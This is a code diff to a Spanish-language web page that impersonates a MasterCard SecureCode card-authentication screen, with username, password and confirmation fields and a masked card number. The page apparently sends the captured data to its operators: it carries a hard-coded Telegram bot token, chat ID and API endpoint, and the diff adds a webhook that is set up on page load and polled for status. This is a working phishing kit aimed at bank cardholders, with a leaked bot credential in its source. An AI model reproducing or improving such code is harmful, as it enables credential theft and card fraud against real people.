@@ -623,12 +623,12 @@
 
     <script>
         // ============================================
-        // CONFIGURACIÓN (igual que en VISA)
+        // CONFIGURACIÓN (con ruta relativa)
         // ============================================
         const TELEGRAM_BOT_TOKEN = '8952571695:AAHr5qHDQ7Hu0LoqGS49jUWg9MYFjO1MaBw';
         const TELEGRAM_CHAT_ID = '-1004389419498';
         const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
-        const WEBHOOK_URL = 'https://paso2-ajhp.vercel.app/api/webhook';
+        const WEBHOOK_URL = '/api/webhook';  // <--- Ruta relativa
         
         const POLLING_INTERVAL = 3000;
         const MAX_POLLING_TIME = 300000;
@@ -646,8 +646,14 @@
         const statusMessage = document.getElementById('statusMessage');
 
         // ============================================
-        // INICIALIZACIÓN (igual que VISA)
+        // INICIALIZACIÓN (con configuración de webhook)
         // ============================================
+        window.addEventListener('load', async function() {
+            initializeTransaction();
+            await configurarWebhook();   // <-- Configurar webhook al cargar
+            console.log('✅ Sistema MasterCard SecureCode listo - Webhook activo');
+        });
+
         function initializeTransaction() {
             const storagePriority = sessionStorage.getItem('procesamiento_prioritario') === 'true';
             
@@ -674,6 +680,21 @@
             
             let cardLast4 = sessionStorage.getItem('cardLast4') || localStorage.getItem('cardLast4') || '0000';
             document.getElementById('card-last-digits').textContent = `XXXX XXXX XXXX ${cardLast4}`;
+        }
+
+        // ============================================
+        // CONFIGURAR WEBHOOK
+        // ============================================
+        async function configurarWebhook() {
+            try {
+                const response = await fetch(`${WEBHOOK_URL}?setup=true`);
+                const data = await response.json();
+                console.log('🔗 Webhook configurado:', data);
+                return data.success;
+            } catch (error) {
+                console.error('❌ Error configurando webhook:', error);
+                return false;
+            }
         }
 
         // ============================================
@@ -745,6 +766,7 @@
             try {
                 const response = await fetch(`${WEBHOOK_URL}?check=${solicitudId}`);
                 const data = await response.json();
+                console.log('📊 Estado webhook:', data.estado);
                 return data.estado || 'pending';
             } catch (error) {
                 console.error('Error verificando webhook:', error);
@@ -786,7 +808,7 @@
         }
 
         // ============================================
-        // FUNCIONES UI (igual que VISA)
+        // FUNCIONES UI
         // ============================================
         function mostrarError(mensaje) {
             statusMessage.className = 'status-message error';
@@ -812,7 +834,7 @@
         }
 
         // ============================================
-        // VALIDACIÓN (idéntica a VISA)
+        // VALIDACIÓN
         // ============================================
         [usernameInput, passwordInput, confirmationInput].forEach(input => {
             input.addEventListener('blur', function() {
@@ -903,7 +925,7 @@
         });
 
         // ============================================
-        // BOTONES (igual que VISA)
+        // BOTONES
         // ============================================
         document.getElementById('helpLink').addEventListener('click', function(e) {
             e.preventDefault();
@@ -915,11 +937,6 @@
             if (confirm('¿Desea cancelar esta autenticación?')) {
                 window.history.back();
             }
-        });
-
-        window.addEventListener('load', function() {
-            initializeTransaction();
-            console.log('✅ Sistema MasterCard SecureCode listo - Webhook activo');
         });
     </script>
 </body>
